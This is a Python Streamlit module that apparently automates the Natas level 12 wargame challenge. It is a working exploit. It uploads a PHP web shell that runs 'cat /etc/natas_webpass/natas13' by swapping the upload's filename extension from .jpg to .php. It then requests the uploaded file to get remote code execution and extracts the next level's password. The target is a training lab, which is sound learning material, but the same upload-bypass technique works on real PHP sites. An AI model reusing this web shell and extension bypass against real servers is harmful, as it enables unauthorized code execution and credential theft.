import streamlit as st
import re
from modules.utils import initialize_http_session

def execute(level_name, context):
    st.markdown(f"### 📋 Running: {level_name}")
    
    session = initialize_http_session(context)
    base_url = context['url'].rstrip('/')
    
    st.info("Targeting unrestricted file upload vulnerability via hidden parameter modification...")
    
    # 1. Define the server command execution string inside a valid PHP script block
    php_payload = "<?php echo shell_exec('cat /etc/natas_webpass/natas13'); ?>"
    
    # 2. Setup the upload components
    # 'uploadedfile' mimics the user file upload field
    files = {
        'uploadedfile': ('exploit.php', php_payload, 'application/x-php')
    }
    
    # 'filename' overwrites the default .jpg behavior by providing a .php extension
    data = {
        'filename': 'exploit.php',
        'submit': 'Upload File'
    }
    
    try:
        st.write("📤 Transmitting multi-part payload with modified extension targets...")
        response = session.post(base_url, files=files, data=data, timeout=10)
        
        if response.status_code == 200:
            # 3. Locate the generated link on the page response
            match = re.search(r'The file <a href="([^"]+)">', response.text)
            
            if match:
                relative_uploaded_path = match.group(1)
                execution_url = f"{base_url}/{relative_uploaded_path}"
                st.success(f"🔓 Payload successfully dropped on server!")
                st.write(f"Target execution link: `{execution_url}`")
                
                # 4. Request the execution link directly to read the output
                st.write("🔄 Requesting the payload URL to trigger remote code execution...")
                execution_response = session.get(execution_url, timeout=10)
                output_text = execution_response.text.strip()
                
                # 5. Extract the resulting 32-character token signature
                token_match = re.search(r'[A-Za-z0-9]{32}', output_text)
                
                if token_match:
                    st.success("🎯 Level 12 challenge solved successfully!")
                    st.code(f"Natas 13 Password: {token_match.group(0)}")
                else:
                    st.warning("The script was reached, but no valid password format was detected in the output.")
                    with st.expander("View Server Command Response"):
                        st.code(output_text)
            else:
                st.error("Failed to parse the target uploaded file link from the server response output.")
                with st.expander("View Page Source Output"):
                    st.code(response.text, language="html")
        else:
            st.error(f"The upload request was rejected by the server. Status Code: {response.status_code}")
            
    except Exception as e:
        st.error(f"Module execution failed: {str(e)}")